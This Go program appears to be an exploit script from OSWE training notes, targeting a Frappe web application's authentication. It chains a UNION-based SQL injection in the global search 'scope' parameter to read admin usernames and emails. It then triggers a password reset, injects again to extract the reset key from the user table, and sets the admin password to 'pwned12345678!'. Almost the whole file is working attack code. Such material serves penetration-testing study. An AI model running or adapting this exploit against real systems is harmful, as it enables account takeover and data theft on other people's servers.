package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/tidwall/gjson"
	"log"
	"net/http"
	"net/url"
	"os"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Chp 8.4 - Auth Bypass

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func getAdminUser(debug bool, ip string) (bool, string) {
	requestURL := fmt.Sprintf("http://%s:8000/", ip)

	data := url.Values{
		"cmd":   {"frappe.utils.global_search.web_search"},
		"text":  {"offsec"},
		"scope": {"offsec_scope\" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#"},
	}

	request := utils.PostRequest{
		ContentType: "form",
		Cookies: []*http.Cookie{
			{
				Name:  "system_user",
				Value: "yes",
			},
			{
				Name:  "full_name",
				Value: "Guest",
			},
			{
				Name:  "sid",
				Value: "Guest",
			},
			{
				Name:  "user_id",
				Value: "Guest",
			},
		},
		FormData: data,
	}

	response := utils.SendPostRequest(client, debug, requestURL, request)

	if response.StatusCode != 200 {
		return false, ""
	}

	json := response.ResponseBody
	username := gjson.Get(json, "message.0.route")
	utils.PrintSuccess("Username: " + username.String())

	email := gjson.Get(json, "message.1.route")
	utils.PrintSuccess("Email: " + email.String())

	return true, email.String()
}

func forgetPassword(debug bool, ip, email string) bool {
	requestURL := fmt.Sprintf("http://%s:8000/", ip)

	data := url.Values{
		"cmd":  {"frappe.core.doctype.user.user.reset_password"},
		"user": {email},
	}

	request := utils.PostRequest{
		ContentType: "form",
		Cookies: []*http.Cookie{
			{
				Name:  "system_user",
				Value: "yes",
			},
			{
				Name:  "full_name",
				Value: "Guest",
			},
			{
				Name:  "sid",
				Value: "Guest",
			},
			{
				Name:  "user_id",
				Value: "Guest",
			},
		},
		FormData: data,
	}

	response := utils.SendPostRequest(client, debug, requestURL, request)

	json := response.ResponseBody
	message := gjson.Get(json, "message")

	if response.StatusCode != 200 || (message.String() == "not found" && response.StatusCode == 200) {
		return false
	}

	utils.PrintSuccess("Forget Password triggered...")

	return true
}

func extractResetPasswordKey(debug bool, ip, email string) (bool, string) {
	requestURL := fmt.Sprintf("http://%s:8000/", ip)

	data := url.Values{
		"cmd":   {"frappe.utils.global_search.web_search"},
		"text":  {"offsec"},
		"scope": {"offsec_scope\" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#"},
	}

	request := utils.PostRequest{
		ContentType: "form",
		Cookies: []*http.Cookie{
			{
				Name:  "system_user",
				Value: "yes",
			},
			{
				Name:  "full_name",
				Value: "Guest",
			},
			{
				Name:  "sid",
				Value: "Guest",
			},
			{
				Name:  "user_id",
				Value: "Guest",
			},
		},
		FormData: data,
	}

	response := utils.SendPostRequest(client, debug, requestURL, request)

	if response.StatusCode != 200 {
		return false, ""
	}

	json := response.ResponseBody
	key := gjson.Get(json, fmt.Sprintf("message.#(doctype==\"%s\").route", email))
	utils.PrintSuccess("Password Reset Key: " + key.String())

	return true, key.String()
}

func resetPassword(debug bool, ip, key string) bool {
	requestURL := fmt.Sprintf("http://%s:8000/", ip)

	data := url.Values{
		"cmd":                 {"frappe.core.doctype.user.user.update_password"},
		"key":                 {key},
		"old_password":        {""},
		"new_password":        {"pwned12345678!"},
		"logout_all_sessions": {"1"},
	}

	request := utils.PostRequest{
		ContentType: "form",
		Cookies: []*http.Cookie{
			{
				Name:  "system_user",
				Value: "yes",
			},
			{
				Name:  "full_name",
				Value: "Guest",
			},
			{
				Name:  "sid",
				Value: "Guest",
			},
			{
				Name:  "user_id",
				Value: "Guest",
			},
		},
		FormData: data,
	}

	response := utils.SendPostRequest(client, debug, requestURL, request)

	if response.StatusCode != 200 {
		return false
	}

	utils.PrintSuccess("Password changed!")

	return true
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 2 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-debug=true] [-proxy=true] <target>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.197.123", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{
		Transport: tr,
	}

	result, email := getAdminUser(*debug, ip)
	if !result {
		utils.PrintFailure("Failed to get Admin user!")
		os.Exit(1)
	}

	result = forgetPassword(*debug, ip, email)
	if !result {
		utils.PrintFailure("Failed to trigger Forget Password!")
		os.Exit(1)
	}

	result, key := extractResetPasswordKey(*debug, ip, email)
	if !result {
		utils.PrintFailure("Failed to extract password reset key!")
		os.Exit(1)
	}

	result = resetPassword(*debug, ip, key)
	if !result {
		utils.PrintFailure("Failed to reset password!")
		os.Exit(1)
	}

	fmt.Println("")
	utils.PrintSuccess("Done!")
}
